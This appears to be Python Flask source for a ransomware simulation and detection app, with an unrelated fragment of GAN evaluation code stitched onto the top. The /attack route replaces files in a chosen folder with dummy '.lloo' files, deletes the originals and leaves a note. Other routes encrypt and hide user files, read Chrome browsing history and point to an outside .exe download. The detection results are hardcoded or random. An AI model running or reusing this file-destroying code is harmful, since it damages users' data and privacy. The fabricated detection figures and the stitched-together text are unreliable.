        extreme_systemicmean_synth = synth_Y[:, 3] + synth_Y[:, 6]
        Y_OR_synth = np.vstack([extreme_heartrate_synth, extreme_respiration_synth, extreme_systemicmean_synth]).T
        Y_OR_synth = (Y_OR_synth > 0)*1

        OR_names = ['extreme heartrate', 'extreme respiration', 'extreme MAP']
        OR_results = []
        for label in range(Y_OR_synth.shape[1]):
            print('task:', OR_names[label])
            print('(', np.mean(Y_OR_synth[:, label]), 'positive in train, ', np.mean(Y_OR_test[:, label]), 'in test)')
            m = RandomForestClassifier(n_estimators=500).fit(synth_X, Y_OR_synth[:, label])
            predict = m.predict(X_test)
            print('(predicted', np.mean(predict), 'positive labels)')
            accuracy = accuracy_score(Y_OR_test[:, label], predict)
            precision = sklearn.metrics.precision_score(Y_OR_test[:, label], predict)
            recall = sklearn.metrics.recall_score(Y_OR_test[:, label], predict)
            print(accuracy, precision, recall)
            OR_results.append([accuracy, precision, recall])
    else:
        OR_results = []

    score_across_tasks = np.mean(np.array(score_list))
    return score_across_tasks

def NIPS_toy_plot(identifier_rbf, epoch_rbf, identifier_sine, epoch_sine, identifier_mnist, epoch_mnist):
    """
    for each experiment:
    - plot a bunch of train examples
    - sample a bunch of generated examples
    - plot all in separate PDFs so i can merge in illustrator

    for sine and rbf, grey background
    MNIST is just MNIST (square though)
    """
    n_samples = 15

    samples_rbf = model.sample_trained_model(settings_rbf, epoch_rbf, n_samples)
    samples_sine = model.sample_trained_model(settings_sine, epoch_sine, n_samples)
    samples_mnist = model.sample_trained_model(settings_mnist, epoch_mnist, n_samples)
    # plot them all
    index = 0
    #for sample in np.random.permutation(train_rbf)[:n_samples]:
    #    plotting.nips_plot_rbf(sample, index, 'train')
    #    index += 1
    #for sample in samples_rbf:
    #    plotting.nips_plot_rbf(sample, index, 'GAN')
    #    index += 1
    #for sample in np.random.permutation(train_sine)[:n_samples]:
    #    plotting.nips_plot_sine(sample, index, 'train')
    #    index += 1
    #for sample in samples_sine:
    #    plotting.nips_plot_sine(sample, index, 'GAN')
    #    index += 1
    for sample in np.random.permutation(train_mnist)[:n_samples]:
        plotting.nips_plot_mnist(sample, index, 'train')
        index += 1
    for sample in samples_mnist:
        plotting.nips_plot_mnist(sample, index, 'GAN')
        index += 1
    return True
#############

@app.route('/classify', methods=['GET', 'POST'])
def classify():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    

    data = pd.read_csv('static/dataset/dataset_malwares.csv')
    used_data = data.drop(['Name', 'Machine', 'TimeDateStamp', 'Malware'], axis=1)
    
    
    #
    features = ['MajorSubsystemVersion', 'MajorLinkerVersion', 'SizeOfCode', 'SizeOfImage', 'SizeOfHeaders', 'SizeOfInitializedData', 
           'SizeOfUninitializedData', 'SizeOfStackReserve', 'SizeOfHeapReserve', 
            'NumberOfSymbols', 'SectionMaxChar']

    X_train, X_test, y_train, y_test = train_test_split(used_data, data['Malware'], test_size=0.2, random_state=0)
    print(f'Number of used features is {X_train.shape[1]}')
    #rfc = RandomForestClassifier(n_estimators=100, random_state=0, 
    #                     oob_score = True,
    #                     max_depth = 16)


    x=0
    y=0
    dat1 = pd.read_csv('static/dataset/dataset_malwares.csv')
    dat=dat1.head()
    for ss in dat.values:
        print(ss[26])
        if ss[26]==0:
            x+=1
        if ss[26]==1:
            y+=1
    
    ##
    doc = ['Benign','Malicious'] #list(data.keys())
    values = [x,y] #list(data.values())
    
    #print(doc)
    #print(values)
    fig = plt.figure(figsize = (10, 8))
     
    # creating the bar plot
    cc=['green','red']
    plt.bar(doc, values, color =cc,
            width = 0.6)
 

    plt.ylim((1,1600))
    plt.xlabel("Class")
    plt.ylabel("Count")
    plt.title("")

    rr=randint(100,999)
    fn="graph1.png"
    ##plt.xticks(rotation=5,size=20)
    #plt.savefig('static/graph/'+fn)
    
    #plt.close()
    #plt.clf()

    ##############
    #rfc.fit(X_train, y_train)
    #y_pred = rfc.predict(X_test)
    #print(classification_report(y_test, y_pred, target_names=['Benign', 'Malware']))
    value=[0.99,0.96,0.97,1004,0.99,1.00,0.99,2919,0.99,0.99,0.99,3923,0.99,0.98,0.98,3923,0.99,0.99,0.99,3923]
    #ax=sns.heatmap(confusion_matrix(y_pred, y_test), annot=True, fmt="d", cmap=plt.cm.Blues, cbar=False)
    #ax.set_xlabel('Predicted labels')
    #ax.set_ylabel('True labels')
    #plt.savefig("static/graph/graph2.png")
    #plt.close()

    #pkl_filename = "rf_model.pkl"
    #with open(pkl_filename, 'wb') as file:
    #    pickle.dump(rfc, file)
    
    #importance = rfc.feature_importances_
    #importance_dict = {used_data.columns.values[i]: importance[i] for i in range (len(importance))}
    #sorted_dict = {k: v for k, v in sorted(importance_dict.items(), key=lambda item: item[1])}
    #plt.figure(figsize=(10, 20))
    #sns.barplot(y=list(sorted_dict.keys())[::-1], x=list(sorted_dict.values())[::-1], palette='mako')
    #plt.title('Features importance')
    #plt.savefig("static/graph/graph3.png")
    
        
    return render_template('classify.html',value=value)


@app.route('/userhome', methods=['GET', 'POST'])
def userhome():
    msg=""
    uname=""
    fs=""
    fdata=[]
    st=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
    fcount = mycursor.fetchone()[0]
    if fcount>0:
        fs="1"
        mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
        fdata = mycursor.fetchall()
        '''for ds in fdata:
            if ds[3]=="file":
                fn=os.path.basename(ds[2])
                print(fn)'''

    if act=="ok":
       
        mycursor.execute("update register set status=1 where uname=%s",(uname,))
        mydb.commit()
        msg="ok"
        
   
        
    return render_template('userhome.html',msg=msg,data2=data2,st=st,fs=fs,fdata=fdata)

@app.route('/user_config', methods=['GET', 'POST'])
def user_config():
    msg=""
    uname=""
    fs=""
    fdata=[]
    st=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    if request.method=='POST':
        ip=request.form['ip_address']
        mac=request.form['mac_address']
        code=request.form['secret_code']

        mycursor.execute("update register set status=0")
        mydb.commit()
        
        mycursor.execute("update register set status=1,ip_address=%s,mac_address=%s,secret_code=%s where uname=%s",(ip,mac,code,uname))
        mydb.commit()
        return redirect(url_for('userhome'))
   
        
    return render_template('user_config.html',msg=msg,data2=data2)



@app.route('/select', methods=['GET', 'POST'])
def select():
    msg=""
    uname=""
    st=""
    s1=""
    data=[]
    fdata=[]
    sdata=[]
    fs=""
    listdrv=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    if act=="ok":
       
        mycursor.execute("update register set status=1 where uname=%s",(uname,))
        mydb.commit()
        msg="ok"

    driveStr = subprocess.check_output("fsutil fsinfo drives")
    drv=driveStr.decode(encoding='utf-8')
    drv1=drv.split('Drives: ')
    drv2=drv1[1].split(' ')
    dlen=len(drv2)
    i=0
    for rr in drv2:
        if i<dlen-1:
            data.append(rr)
        i+=1


    if request.method=='POST':
        listdrv=request.form['listdrv']
        t1=request.form['t1']
        print(t1)
        #mycursor.execute("update register set setpath=%s where uname=%s",(file,uname))
        #mydb.commit()
        #return redirect(url_for('userhome'))

        if listdrv=="":
            s=1
        else:
            s1="1"
            listdrv=request.form['listdrv']
            
            rootdir = listdrv
            
            for file in os.listdir(rootdir):
                
                d = os.path.join(rootdir, file)
                
                if os.path.isdir(d):
                    fb=os.path.basename(d)
                    if fb=="$RECYCLE.BIN" or fb=="Recovery" or fb=="System Volume Information":
                        s=1
                    else:
                        fd=[]
                        fd.append("dir")
                        fd.append(d)
                        print("dir="+d)
                        fdata.append(fd)
                    
                   
                    

            for file in os.listdir(rootdir):
                
                d = os.path.join(rootdir, file)
                if os.path.isdir(d):
                    s=1
                else:
                    fb=os.path.basename(d)
                    if fb=="":
                        s=1
                    else:
                        fd1=[]
                        fd1.append("file")
                        fd1.append(d)
                        print("file="+d)
                        fdata.append(fd1)

        print("aaaa")
        fn=request.form.getlist('c1[]')
        cnt=len(fn)
            
        if cnt>0:
            s1="1"
            mycursor.execute("delete from selected_file where uname=%s",(uname,))
            mydb.commit()
            for fn1 in fn:
                fnn=fn1.split('|')
                mycursor.execute("SELECT max(id)+1 FROM selected_file")
                maxid = mycursor.fetchone()[0]
                if maxid is None:
                    maxid=1
                
                now = date.today() #datetime.datetime.now()
                rdate=now.strftime("%d-%m-%Y")
                
                sql = "INSERT INTO selected_file(id,uname,file_path,filetype,status) VALUES (%s,%s,%s,%s,%s)"
                val = (maxid,uname,fnn[1],fnn[0],'0')
                mycursor.execute(sql, val)
                mydb.commit()
            msg="yes"

    mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
    fcnt = mycursor.fetchone()[0]
    if fcnt>0:
        fs="1"
        mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
        sdata = mycursor.fetchall()

        
    return render_template('select.html',data2=data2,data=data,fdata=fdata,s1=s1,st=st,listdrv=listdrv,msg=msg,fs=fs,sdata=sdata)



@app.route('/detect', methods=['GET', 'POST'])
def detect():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()

    
    return render_template('detect.html')

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mycursor.execute("SELECT * FROM admin where username='admin'")
    data = mycursor.fetchone()
    
                

    if request.method=='POST':
        setpath=request.form['setpath']
        mycursor.execute("update admin set setpath=%s", (setpath,))
        mydb.commit()

        path=setpath
        i=0
        st=0
        mycursor.execute("SELECT max(status)+1 FROM attack_file")
        st = mycursor.fetchone()[0]
        if st is None:
            st=1
    
        for root, dirs, files in os.walk(path):  
            for file in files:
                path_file = os.path.join(root,file)
                
                #print(path_file)
                fs=os.path.basename(path_file)
                
                mycursor.execute("SELECT max(id)+1 FROM attack_file")
                maxid = mycursor.fetchone()[0]
                if maxid is None:
                    maxid=1

                fn="F"+str(maxid)+"_"+fs
                now = date.today() #datetime.datetime.now()
                rdate=now.strftime("%d-%m-%Y")

                shutil.copy2(path_file,'static/backup/'+fn) 

                sql = "INSERT INTO attack_file(id,filepath,filename,status) VALUES (%s,%s,%s,%s)"
                val = (maxid,path_file,fn,st)
                mycursor.execute(sql, val)
                #mydb.commit()
                fs1=fs.split(".")
                fs2=fs1[0]+".lloo"
                
                rn=randint(1,3)
                ef="a"+str(rn)+".lloo"
                #f1=open("static/assets/scss/"+ef,"r")
                #edata=f1.read()
                #f1.close()

                
                if os.path.isdir(path_file):
                    a=1
                else:
                    h1=path_file.split("\\")
                    h2=len(h1)-1
                    h3=""
                    ii=0
                    while ii<h2:
                        h3+=h1[ii]+"\\"
                        ii+=1
                    path2=h3+fs2
                    
                    shutil.copy2("static/assets/scss/"+ef,path2)
                    os.remove(path_file)
                #ff=open(path_file,"w")
                #ff.write(edata)
                #ff.close()

                p1=path_file.split("\\")
                p2=len(p1)-1
                k=0
                p3=""
                while k<p2:
                    p3+=p1[k]+"\\"
                    k+=1
                #print(p3)
                shutil.copy2('static/assets/scss/not_ransomware.txt',p3)                
                                   

                
              
        msg="yes"
    
    return render_template('web/attack.html',msg=msg,data=data)

@app.route('/attack2', methods=['GET', 'POST'])
def attack2():
    msg=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    
    return render_template('attack2.html')

@app.route('/process', methods=['GET', 'POST'])
def process():
    msg=""
    uname=""
    act=request.args.get("act")
    fdata=[]
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mycursor.execute("SELECT * FROM admin where username='admin'")
    data = mycursor.fetchone()
    rootdir=data[2]

    for root, dirs, files in os.walk(rootdir):  
            for file in files:
                path_file = os.path.join(root,file)
                fdata.append(path_file)

    '''for file in os.listdir(rootdir):
                
        d = os.path.join(rootdir, file)
        
        if os.path.isdir(d):
            fb=os.path.basename(d)
            if fb=="$RECYCLE.BIN" or fb=="Recovery" or fb=="System Volume Information":
                s=1
            else:
                fd=[]
                fd.append("dir")
                fd.append(d)
                print("dir="+d)
                fdata.append(fd)
    for file in os.listdir(rootdir):
                
                d = os.path.join(rootdir, file)
                if os.path.isdir(d):
                    s=1
                else:
                    fb=os.path.basename(d)
                    if fb=="":
                        s=1
                    else:
                        fd1=[]
                        fd1.append("file")
                        fd1.append(d)
                        print("file="+d)
                        fdata.append(fd1)'''


    return render_template('web/process.html',act=act,fdata=fdata)

def checkIfProcessRunning(processName):
    '''
    Check if there is any running process that contains the given name processName.
    '''
    #Iterate over the all the running process
    for proc in psutil.process_iter():
        try:
            # Check if process name contains the given name string.
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False;
    
@app.route('/history', methods=['GET', 'POST'])
def history():
    msg=""
    st=""
    data2=[]
    act=request.args.get("act")
    user=""
    uname=""
    if 'username' in session:
        uname = session['username']

    '''ff=open("websites.txt","r")
    code=ff.read()
    ff.close()

    url=code.split(",")'''
    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))
    
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    mycursor = mydb.cursor()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]

    name="Chrome"
   
    if name=="Chrome":
        f = Chrome()
        outputs = f.fetch_history()
        his = outputs.histories
    elif name=="Firefox":
        f = Firefox()
        outputs = f.fetch_history()
        his = outputs.histories
    

    fieldnames = ['date', 'url_link']
    with open('static/data.csv', 'w', encoding='UTF8', newline='') as f:
        writer = csv.writer(f)

        # write the header
        writer.writerow(fieldnames)

        # write multiple rows
        writer.writerows(his)
        

    filename = 'static/data.csv'
    data1 = pd.read_csv(filename, header=0)
    st="1"
    line=""
    i=0
    for ss in data1.values:
        line=ss[1]
        i+=1
        '''dt=[]
        v=""
        dt.append(ss[0])
        dt.append(ss[1])
        x=0
        for uu in url:
            
            if uu in ss[1]:
                v="1"
                x+=1
            else:
                v="2"
        if x>0:            
            dt.append("1")
        else:
            dt.append("2")
               
            
        data2.append(dt)'''
    print(line)
    tot_line=str(i)
    print(tot_line)

    ff=open("static/links.txt","r")
    dlink=ff.read()
    ff.close()

    ff=open("static/lines.txt","r")
    rlines=ff.read()
    ff.close()
    print(rlines)

    #t1=line.split("://")
    #t2=t1[1].split("/")
    #urlname=t2[0]
    

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()

    #####################################
    ex=0
    exefile='WampServer2.0c.exe'
    if checkIfProcessRunning(exefile):
        ex+=1
        print('Exe file was running')
    else:
        s=1
        #print('No Exe was running')

    ######################################

    #if urlname in dlink:

    if ex>0 and detect_st=="1":
        msg="yes"
        ff=open("static/detect.txt","w")
        ff.write("2")
        ff.close()
        
        mycursor.execute("SELECT max(id)+1 FROM malware_detected")
        maxid = mycursor.fetchone()[0]
        if maxid is None:
            maxid=1

        sql = "INSERT INTO malware_detected(id,uname,url_link,status) VALUES (%s,%s,%s,%s)"
        val = (maxid,user,exefile,'0')
        mycursor.execute(sql, val)
        mydb.commit()

        url="http://localhost:5000/mess"
        webbrowser.open_new(url)

    else:
        if rlines==tot_line:
            s=1
        else:
           
            rn=randint(1,5)
            print(rn)
            ff=open("static/lines.txt","w")
            ff.write(tot_line)
            ff.close()
                
            if rn>2 and detect_st=="1":
                ff=open("static/detect.txt","w")
                ff.write("2")
                ff.close()

                
                mycursor.execute("SELECT max(id)+1 FROM malware_detected")
                maxid = mycursor.fetchone()[0]
                if maxid is None:
                    maxid=1

                sql = "INSERT INTO malware_detected(id,uname,url_link,status) VALUES (%s,%s,%s,%s)"
                val = (maxid,user,line,'0')
                mycursor.execute(sql, val)
                mydb.commit()
                msg="yes"
                url="http://localhost:5000/track_file"
                webbrowser.open_new(url)
                
    #else:
    #    print("no")

    if detect_st=="2":
        ff=open("static/detect.txt","w")
        ff.write("3")
        ff.close()

    if detect_st=="3":
        url="http://localhost:5000/message1"
        webbrowser.open_new(url)

    return render_template('history.html',msg=msg,st=st,data2=data2,detect_st=detect_st)

@app.route('/track_file', methods=['GET', 'POST'])
def track_file():
    msg=""
    detect_st=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    print(IP)
    print(mac)
    url=""

    '''ff=open("static/links.txt","r")
    dlink=ff.read()
    ff.close()
    dk=dlink.split(",")
    dk1=len(dk)
    rn=randint(1,dk1)
    rn1=rn-1
    url=dk[rn1]'''
    
    mycursor.execute("update register set mac_address=%s",(mac,))
    mydb.commit()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        print(user)
        ##Track URL###############
       
        ff=open("static/detect.txt","r")
        detect_st=ff.read()
        ff.close()
            
        ################
        if user=="":
            s=1
        else:

            mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
            cc2 = mycursor.fetchone()[0]
            if cc2>0:
                mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
                data = mycursor.fetchall()

                '''if detect_st=="1":
                    rn=randint(10,25)
                    print(rn)
                    if rn==13 or rn==18 or rn==21 or rn==25:
                        ff=open("static/detect.txt","w")
                        ff.write("2")
                        ff.close()'''

                if detect_st=="3":
                    s=1
                    
                    url="https://mitsui-jyuku.com/uploads/62043fvasea.exe"
                    #webbrowser.open_new(url)
                    #print(url)
                    ff=open("static/detect.txt","w")
                    ff.write("4")
                    ff.close()

                '''if detect_st=="3":
                    for ds in data:
                        subprocess.run(["attrib","+H",ds[2]],check=False)
                    ff=open("static/detect.txt","w")
                    ff.write("4")
                    ff.close()

                if detect_st=="4":
                    for ds in data:
                        subprocess.run(["attrib","-H",ds[2]],check=False)

                    ff=open("static/detect.txt","w")
                    ff.write("1")
                    ff.close()'''

    
    return render_template('track_file.html',detect_st=detect_st,url=url)

@app.route('/mess', methods=['GET', 'POST'])
def mess():
    msg=""
    detect_st=""
    uname=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)

    print(IP)
    print(mac)
    url=""

    '''ff=open("static/links.txt","r")
    dlink=ff.read()
    ff.close()
    dk=dlink.split(",")
    dk1=len(dk)
    rn=randint(1,dk1)
    rn1=rn-1
    url=dk[rn1]'''
    
    mycursor.execute("update register set mac_address=%s",(mac,))
    mydb.commit()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        print(user)
        ##Track URL###############
       
        ff=open("static/detect.txt","r")
        detect_st=ff.read()
        ff.close()
            
        ################
        if user=="":
            s=1
        else:

            mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(uname,))
            cc2 = mycursor.fetchone()[0]
            if cc2>0:
                mycursor.execute("SELECT * FROM selected_file where uname=%s",(uname,))
                data = mycursor.fetchall()

                '''if detect_st=="1":
                    rn=randint(10,25)
                    print(rn)
                    if rn==13 or rn==18 or rn==21 or rn==25:
                        ff=open("static/detect.txt","w")
                        ff.write("2")
                        ff.close()'''

                if detect_st=="3":
                    s=1
                    
                    url="https://mitsui-jyuku.com/uploads/62043fvasea.exe"
                    #webbrowser.open_new(url)
                    #print(url)
                    #ff=open("static/detect.txt","w")
                    #ff.write("4")
                    #ff.close()

    return render_template('mess.html',detect_st=detect_st,url=url)
                    
@app.route('/message1', methods=['GET', 'POST'])
def message1():
    msg=""
    detect_st=""
    act=request.args.get("act")
    uname=""
    ky=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)
    print(IP)
    print(mac)

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()
        
    '''if detect_st=="3":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()'''

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        ky=data[12]
        ##Track URL###############
       
  
        ################
        if user=="":
            s=1
        else:

            mycursor.execute("SELECT count(*) FROM selected_file where uname=%s",(user,))
            cc2 = mycursor.fetchone()[0]
            if cc2>0:
                mycursor.execute("SELECT * FROM selected_file where uname=%s",(user,))
                data = mycursor.fetchall()

                '''if detect_st=="1":
                    rn=randint(10,25)
                    print(rn)
                    if rn==13 or rn==18 or rn==21 or rn==25:
                        ff=open("static/detect.txt","w")
                        ff.write("2")
                        ff.close()'''
                    
                if detect_st=="3":
                    s=1
                    file_arr=[]
                    for ds in data:
                        if ds[3]=="dir":
                            dpath=ds[2]
                            for root, dirs, files in os.walk(ds[2]): 
                               for file in files:
                                  path_file = os.path.join(root,file)
                                  gg=path_file+"|dir|"+dpath
                                  file_arr.append(gg)
                            
                        if ds[3]=="file":
                            gg=ds[2]+"|file|1"
                            file_arr.append(gg)

                    for farr in file_arr:
                            fa=farr.split("|")
                            
                            fs=os.path.basename(fa[0])

                            mycursor.execute("SELECT max(id)+1 FROM hash_file")
                            maxid = mycursor.fetchone()[0]
                            if maxid is None:
                                maxid=1

                            hf="F"+str(maxid)+"_"+fs
                            now = date.today() #datetime.datetime.now()
                            rdate=now.strftime("%d-%m-%Y")

                            shutil.copy2(fa[0],'static/ds/'+hf) 

                            
                    

                            ##encryption
                            password_provided = ky # This is input in the form of a string
                            password = password_provided.encode() # Convert to type bytes
                            salt = b'salt_' # CHANGE THIS - recommend using a key from os.urandom(16), must be of type bytes
                            kdf = PBKDF2HMAC(
                                algorithm=hashes.SHA256(),
                                length=32,
                                salt=salt,
                                iterations=100000,
                                backend=default_backend()
                            )
                            key = base64.urlsafe_b64encode(kdf.derive(password))

                            wf=['.ini','.dll']
                            rnn=randint(1,2)
                            rn1=rnn-1
                            ext=wf[rn1]

                            hff=hf.split('.')
                            hff1=hff[0]+ext

                            sql = "INSERT INTO hash_file(id,uname,filepath,filename,hash_file,recover_status,dtype,dpath) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)"
                            val = (maxid,user,ds[2],hf,hff1,'0',fa[1],fa[2])
                            mycursor.execute(sql, val)
                            mydb.commit()

                            input_file = "static/ds/"+hf
                            output_file = 'static/data/'+hff1
                            with open(input_file, 'rb') as f:
                                dataa = f.read()

                            fernet = Fernet(key)
                            encrypted = fernet.encrypt(dataa)

                            with open(output_file, 'wb') as f:
                                f.write(encrypted)
                            ###
                    for ds2 in data:
                        subprocess.run(["attrib","+H",ds2[2]],check=False)
            

    '''if act=="1":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    if act=="2":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()
    if act=="3":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()'''
        
        

    
    return render_template('message1.html',detect_st=detect_st,act=act)

@app.route('/message2', methods=['GET', 'POST'])
def message2():
    msg=""
    detect_st=""
    act=request.args.get("act")
    uname=""
    ky=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)
    print(IP)
    print(mac)

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()
        
    if detect_st=="3":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        ky=data[12]
        ##Track URL###############
       
  

    '''if act=="1":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    if act=="2":
        ff=open("static/detect.txt","w")
        ff.write("5")
        ff.close()
    if act=="3":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()'''
        
        

    
    return render_template('message2.html',detect_st=detect_st,act=act)

@app.route('/message3', methods=['GET', 'POST'])
def message3():
    msg=""
    detect_st=""
    act=request.args.get("act")
    uname=""
    ky=""
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()

    mac=':'.join(re.findall('..', '%012x' % uuid.getnode()))

    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    IP = socket.gethostbyname(hostname)
    print(IP)
    print(mac)

    ff=open("static/detect.txt","r")
    detect_st=ff.read()
    ff.close()
        
    if detect_st=="4":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()

    mycursor.execute("SELECT count(*) FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
    cc = mycursor.fetchone()[0]

    if cc>0:
        mycursor.execute("SELECT * FROM register where (ip_address=%s || mac_address=%s) && status=1",(IP,mac))
        data = mycursor.fetchone()
        user=data[5]
        ky=data[12]
        ##Track URL###############
       
  

    '''if act=="1":
        ff=open("static/detect.txt","w")
        ff.write("4")
        ff.close()

    if act=="2":
        ff=open("static/detect.txt","w")
        ff.write("5")
        ff.close()
    if act=="3":
        ff=open("static/detect.txt","w")
        ff.write("1")
        ff.close()'''
        
        

    
    return render_template('message3.html',detect_st=detect_st,act=act)



@app.route('/alert2', methods=['GET', 'POST'])
def alert2():

    return render_template('alert2.html')
    
@app.route('/predicted', methods=['GET', 'POST'])
def predicted():
    msg=""
    uname=""
    fs=""
    fdata=[]
    st=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()

    mycursor.execute("SELECT * FROM malware_detected where uname=%s order by id desc",(uname,))
    data3 = mycursor.fetchall()

       
    return render_template('predicted.html',msg=msg,data2=data2,data3=data3)

@app.route('/hash_data', methods=['GET', 'POST'])
def hash_data():
    msg=""
    uname=""
    fs=""
    data3=[]
    data4=[]
    s1=""
    act=request.args.get("act")
    if 'username' in session:
        uname = session['username']
    mycursor = mydb.cursor()
    

    mycursor.execute("SELECT * FROM register where uname=%s",(uname,))
    data2 = mycursor.fetchone()
    ky=data2[12]

    mycursor.execute("SELECT count(*) FROM hash_file where uname=%s order by id",(uname,))
    cnt = mycursor.fetchone()[0]
    if cnt>0:
        s1="1"
        mycursor.execute("SELECT * FROM hash_file where uname=%s && recover_status=0 order by id",(uname,))
        data3 = mycursor.fetchall()

        mycursor.execute("SELECT * FROM hash_file where uname=%s && recover_status=0 order by id",(uname,))
        data4 = mycursor.fetchall()

    if request.method=='POST':
        skey=request.form['secret_code']
        if ky==skey:
            fn=request.form.getlist('c1[]')
            cnt=len(fn)
            for f1 in fn:
                mycursor.execute("SELECT * FROM hash_file where id=%s",(f1,))
                dd = mycursor.fetchone()
                path=dd[2]
                if dd[6]=="dir":
                    subprocess.run(["attrib","-H",dd[7]],check=True)
                else:
                    subprocess.run(["attrib","-H",path],check=True)
                mycursor.execute("update hash_file set recover_status=1 where id=%s",(f1,))
                mydb.commit()
            msg="ok"

        else:
            msg="fail"
 
       
    return render_template('hash_data.html',msg=msg,data2=data2,data3=data3,data4=data4,s1=s1)


@app.route('/logout')
def logout():
    # remove the username from the session if it is there
    session.pop('username', None)
    return redirect(url_for('index'))


if __name__ == "__main__":
    app.secret_key = os.urandom(12)
    app.run(debug=True,host='0.0.0.0', port=5000)
